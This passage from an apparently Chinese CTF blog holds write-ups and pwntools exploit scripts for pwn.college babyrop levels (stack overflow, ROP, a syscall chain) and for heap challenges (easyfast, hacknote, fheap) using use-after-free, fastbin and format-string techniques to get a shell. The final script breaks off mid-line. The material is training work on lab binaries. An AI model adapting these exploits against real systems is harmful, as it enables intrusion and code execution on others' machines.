class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h4 id=\"Level2\"><a href=\"#Level2\" class=\"headerlink\" title=\"Level2\"></a>Level2</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babyrop_level2.0&quot;</span>)</span><br><span class=\"line\">win1 = <span class=\"number\">0x4022EE</span></span><br><span class=\"line\">win2 = <span class=\"number\">0x40239B</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">88</span> + p64(win1) + p64(win2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h4 id=\"Level3\"><a href=\"#Level3\" class=\"headerlink\" title=\"Level3\"></a>Level3</h4><p>​        从这个level差不多沾了一些rop的边了，需要利用<code>ROPgadget</code>来寻找对应的gadget</p>\n<p>​        </p>\n <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babyrop_level3.0&quot;</span>)</span><br><span class=\"line\">win1 = <span class=\"number\">0x40275A</span></span><br><span class=\"line\">win2 = <span class=\"number\">0x402836</span></span><br><span class=\"line\">win3 = <span class=\"number\">0x402678</span></span><br><span class=\"line\">win4 = <span class=\"number\">0x402592</span></span><br><span class=\"line\">win5 = <span class=\"number\">0x402916</span></span><br><span class=\"line\"></span><br><span class=\"line\">rdi = <span class=\"number\">0x402d03</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">72</span>  </span><br><span class=\"line\">payload += p64(rdi) + p64(<span class=\"number\">1</span>) + p64(win1)</span><br><span class=\"line\">payload += p64(rdi) + p64(<span class=\"number\">2</span>) + p64(win2)</span><br><span class=\"line\">payload += p64(rdi) + p64(<span class=\"number\">3</span>) + p64(win3)</span><br><span class=\"line\">payload += p64(rdi) + p64(<span class=\"number\">4</span>) + p64(win4)</span><br><span class=\"line\">payload += p64(rdi) + p64(<span class=\"number\">5</span>) + p64(win5)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​    </p>\n<h4 id=\"Level4\"><a href=\"#Level4\" class=\"headerlink\" title=\"Level4\"></a>Level4</h4><p>​        </p>\n<p>​        rop，ret2syscall。</p>\n<p>​        这道题其实方法有很多，但是由于栈的空间相对比较小，所以官方给出的做法反而是最聪明也是最实际的。</p>\n<p>（因为如果要orw或者getshell的话似乎还要栈迁移）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">process.write(<span class=\"string\">b&#x27;/flag\\0&#x27;</span>.ljust(<span class=\"number\">88</span>,<span class=\"string\">b&#x27;a&#x27;</span>) + pwn.p64(pop_rax.address)+pwn.p64(<span class=\"number\">90</span>) + pwn.p64(pop_rdi.address)+pwn.p64(<span class=\"built_in\">input</span>) </span><br><span class=\"line\">    ...: + pwn.p64(pop_rsi.address) + pwn.p64(<span class=\"number\">0o777</span>) + pwn.p64(syscall.address))</span><br></pre></td></tr></table></figure>\n\n\n\n<p>我魔怔了</p>\n<p>顺便附一个拿input地址有问题的exp（其实我怀疑gadget的地址也有问题，但是懒得改了）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./babyrop_level4.0&quot;</span>)</span><br><span class=\"line\">syscall = <span class=\"number\">0x401a69</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x401492</span></span><br><span class=\"line\">pop_rax_ret = <span class=\"number\">0x401a91</span></span><br><span class=\"line\">pop_rsi_ret = <span class=\"number\">0x401a71</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;[LEAK] Your input buffer is located at: &quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">input</span>  = u64(p.recv()[:<span class=\"number\">12</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">input</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;/flag\\0&quot;</span>.ljust(<span class=\"number\">88</span>,<span class=\"string\">b&#x27;a&#x27;</span>)  </span><br><span class=\"line\">payload += p64(pop_rax_ret) + p64(<span class=\"number\">90</span>)</span><br><span class=\"line\">payload += p64(pop_rdi_ret) + p64(<span class=\"built_in\">input</span>)</span><br><span class=\"line\">payload += p64(pop_rsi_ret) + p64(<span class=\"number\">0o777</span>)</span><br><span class=\"line\">payload += p64(syscall)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"level5\"><a href=\"#level5\" class=\"headerlink\" title=\"level5\"></a>level5</h4><p>​        这个题也蛮魔怔，和上一个level没有什么区别，但是没有print input buffer，对于我来说也差不多，但是就相对更麻烦了。</p>\n<p>​        </p>\n","categories":["PWN.COLLEGE"],"tags":["pwncollege"]},{"title":"pwn中的python字符串处理问题","url":"/2022/03/12/pwn%E4%B8%AD%E7%9A%84python%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-FJHDMTNe\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p>​        最近在pwncollege做题的时候常常遇到接收的字符串处理不当的问题，故总结整理一下。</p>\n<h3 id=\"字符串截取\"><a href=\"#字符串截取\" class=\"headerlink\" title=\"字符串截取\"></a>字符串截取</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">p.recv()[<span class=\"number\">0</span>:<span class=\"number\">6</span>]\t\t<span class=\"comment\">#截取1-5个字符串</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()[<span class=\"number\">2</span>:<span class=\"number\">6</span>]\t\t<span class=\"comment\">#截取2-5个字符串</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()[:]\t\t<span class=\"comment\">#截取完整字符串</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()[<span class=\"number\">2</span>:]<span class=\"comment\">#从第二个索引开始截取</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()[-<span class=\"number\">4</span>:]<span class=\"comment\">#截取最后四个字符</span></span><br></pre></td></tr></table></figure>\n\n<p>​        </p>\n<h3 id=\"字符串处理\"><a href=\"#字符串处理\" class=\"headerlink\" title=\"字符串处理\"></a>字符串处理</h3><p>​        一般来说我们接收到的数据是字符串的字节流，然后利用pwntools的unpack  module来转换为int型。并且</p>\n<p>​        所以一般来说这样的payload是不会出问题的。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">canary = u64(p.recv()[<span class=\"number\">41</span>:<span class=\"number\">49</span>])</span><br></pre></td></tr></table></figure>\n\n<p>​        </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8A%E5%8D%8811.04.36.png\" alt=\"截屏2022-03-12 上午11.04.36\"></p>\n<p>​        所以当接收到类似以下的报错：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8A%E5%8D%8811.07.11.png\" alt=\"截屏2022-03-12 上午11.07.11\"></p>\n<p>​        </p>\n<p>​        很大概率并不是数据类型转换的问题，而是本身接收的数据存在问题，比如说接收的数据范围错了，或者根本就没有有效的数据。这个时候关注的重点应该是payload的逻辑本身而不是语法问题。</p>\n<p>​        </p>\n","categories":["MESS"],"tags":["mess"]},{"title":"wustctf2020_easyfast","url":"/2022/03/15/week3-1.1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-vGGmrEvp\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p>2022-3-15</p>\n<h4 id=\"wustctf2020-easyfast\"><a href=\"#wustctf2020-easyfast\" class=\"headerlink\" title=\"wustctf2020_easyfast\"></a>wustctf2020_easyfast</h4><p>checksec :</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.39.36.png\" alt=\"截屏2022-03-15 下午3.39.36\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.47.23.png\" alt=\"截屏2022-03-15 下午3.47.23\"></p>\n<p>​        简单逆向一下，有后门函数，当这个地址上储存的数小于等于0时getshell。整体的程序的话是一个没什么特别的菜单，free处有uaf，edit处能对堆指针任意写。</p>\n<p>​        首先逆向以后大体的思路是利用这个UAF进行<code>0x602090</code>的地址处的覆盖。</p>\n<p>​        所以我们需要构造chunk pointer为0x602080的fake chunk，使得对应的用户空间可以被写为0。这里就可以用到edit的任意写功能，将某个chunk的fd覆盖为0x602080，使得下一次申请到该地址的chunk。</p>\n<p>​        首先add再free两个chunk。</p>\n<p>稍微有一个要注意的就是<img src=\"file:///Users/rin/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%889.38.49.png?lastModify=1647351509\" alt=\"截屏2022-03-15 下午9.38.49\"></p>\n<p>这个地址是我们fake chunk的size位，也就是说明这个chunk申请时应该为0x40。也就是所有chunk都应该是0x40大小。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<p>​        然后再将此时先被free的chunk的fd覆盖为0x602080</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%888.43.43.png\" alt=\"截屏2022-03-15 下午8.43.43\"></p>\n<p>​        此时连续add三个chunk，第三个就是我们需要的地址了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> args[<span class=\"string\">&#x27;REMOTE&#x27;</span>]:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">27982</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = process([<span class=\"string\">&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./wustctf2020_easyfast&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/64/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cmd</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;choice&gt;&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&gt;&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&gt;&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx,content</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&gt;&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\">    </span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(<span class=\"number\">0x602080</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">p.sendafter(<span class=\"string\">&quot;choice&gt;\\n&quot;</span>,<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h4 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h4><p>​        其实没有什么好总结的，这算是最水的一类堆题了，纯粹是太久没有做复健一下，一晚上能做三四道。</p>\n","categories":["HEAP - Fastbin Attack"],"tags":["UAF"]},{"title":"lab 10 hacknote","url":"/2022/03/15/week3-1.2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-kRFGLYxg\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p>​        这个题已经做过好多遍了orz，因为不断的摆烂然后复健…..每次又是做这道</p>\n<p>​        逆一下。</p>\n<p>​        话说可以总结一下类似的题目的快速逆向方法。比如说一般肯定会定义一个结构体，结构体中包含比如content和指针的字段，然后如果有可以利用的uaf或者double free的话，就可以覆盖结构体中保存的指针字段，从而进一步攻击。</p>\n<p>​        回到这道题，这里的结构体包含两个字段，一个是<code> print_note_content</code>这个函数的地址，另外一个是结构体的content。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8A%E5%8D%8810.51.14.png\" alt=\"截屏2022-03-16 上午10.51.14\"></p>\n<p>随便申请一个note，chunk布局长这样（因为是32位的程序，所以显示上有些bug，但不影响）</p>\n<p>​        0x804865b就是<code>print_note_content</code>函数的地址，然后前面一个估计是堆上的地址。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *(&amp;notelist + v1) )</span><br><span class=\"line\">  (*(<span class=\"keyword\">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​            接着如果put note，这个print函数就会调用这个<code>print note</code>字段。所以利用思路就是利用UAf然后修改chunk中<code>print note</code>字段的地址为<code>magic()</code>的地址，然后再尝试puts此chunk，就相当于调用了<code>magic()</code>。</p>\n<p>​        但是由于程序并没有直接给出edit的功能，我们需要想办法在合适位置构建fake chunk，使得chunk的print字段正好处于我们可以任意写入内容的fake chunk的content字段。</p>\n<p>​        需要注意的就是free note的过程是分别按顺序先释放content chunk再释放put chunk，并且两个chunk的size不同，fastbin链表的种类也不同，分配的顺序也不同。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">if args[&#x27;REMOTE&#x27;]:</span></span><br><span class=\"line\"><span class=\"string\">    p = remote(&quot;node4.buuoj.cn&quot;,27999)</span></span><br><span class=\"line\"><span class=\"string\">else:</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./hackernote&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/32/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x08048986</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cmd</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,content</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Note size :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content :&quot;</span>)</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Index :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">put</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Index :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;aabb&quot;</span>)<span class=\"comment\">#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;aabb&quot;</span>)<span class=\"comment\">#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#main_arena =&gt; chunk0_print(0x10) =&gt; chunk0_content(0x20)</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#fastbin:</span></span><br><span class=\"line\"><span class=\"comment\">#main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) </span></span><br><span class=\"line\"><span class=\"comment\">#main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)</span></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,p32(magic))</span><br><span class=\"line\"><span class=\"comment\">#chunk2, with 0x10 puts_field and 0x8 content field ,the memory space is poniter to chunk1_print and chunk0_print </span></span><br><span class=\"line\">put(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        </p>\n<p>​        </p>\n<p>​        这个高亮怎么这么怪，为什么多行注释当作字符串处理了啊。</p>\n<p>​        </p>\n<p>​        </p>\n","categories":["HEAP - Fastbin Attack"],"tags":["UAF"]},{"title":"hctf2016_fheap","url":"/2022/03/16/week3-2.1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-gqGfTPhe\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> </p>\n<p>​        第三周第二天第一道堆题。应该是一道中等偏下的fastbinattack。</p>\n<p>​        libc是2.23。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%881.17.22.png\" alt=\"截屏2022-03-16 下午1.17.22\"></p>\n<p>​        保护全开，pie是个麻烦点。</p>\n<p>​        逆向一下，这个程序的逻辑不算很复杂，但是也需要逆清楚。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%883.21.47.png\" alt=\"截屏2022-03-16 下午3.21.47\"></p>\n<p>​        程序在ptr+3的地方保存了一个有着free函数功能的指针，并且当delete str时，也是调用这个指针，而不是free函数本身，所以可以覆盖它为任意函数指针。</p>\n<p>​        为了泄露内存，我们可以尝试调用<code>printf</code>，并构造格式化字符串，找到system的地址，然后可以故技重施，将指针覆盖为system，从而getshell。</p>\n<p>​        所以利用的第一步就是覆盖这个free指针为<code>printf</code>指针，由于程序开启了pie，我们只需要，也只能覆盖指针的最后两个字节。</p>\n<p>​        对于格式化字符串，（其实我不太会》〉》〉这两天多刷一些吧，目前就copy一下大佬的exp）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">if args[&#x27;REMOTE&#x27;]:</span></span><br><span class=\"line\"><span class=\"string\">    p = remote(&quot;node4.buuoj.cn&quot;,27999)</span></span><br><span class=\"line\"><span class=\"string\">else:</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">r = process([<span class=\"string\">&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./pwn-f&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/64/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,content</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;3.quit&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;create &quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Pls give string size:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;str:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;3.quit&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;delete &quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;id:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Are you sure?:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;yes&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">&quot;aaaa&quot;</span>)<span class=\"comment\">#chunk0(0x20)</span></span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">&quot;bbbb&quot;</span>)<span class=\"comment\">#chunk1(0x20)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#main_arena =&gt; chunk1</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>)<span class=\"comment\">#main_arena=&gt; chunk0 =&gt; chunk1</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">25</span>,<span class=\"string\">b&#x27;Start%176$pEnd&#x27;</span>.ljust(<span class=\"number\">24</span>,<span class=\"string\">b&#x27;a&#x27;</span>) + <span class=\"string\">b&#x27;\\xb6&#x27;</span>)<span class=\"comment\">#chukn2 ,point to 